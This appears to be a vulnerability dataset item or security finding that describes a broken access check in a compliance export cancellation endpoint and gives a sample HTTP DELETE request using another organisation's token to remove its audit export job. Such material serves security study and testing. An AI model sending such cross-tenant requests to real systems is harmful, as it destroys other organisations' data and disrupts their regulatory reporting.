diagnosis: The compliance queue cancellation endpoint removes background compliance export jobs solely by jobId, allowing authenticated users to delete pending or active compliance audit exports of other organizations and disrupt their regulatory reporting.
exploit_request:
DELETE /api/queues/compliance-exports/jobs/job_sox_audit_export_2026 HTTP/1.1
Host: audit-worker.saas.cloud:8008
Authorization: Bearer <org_gamma_token>
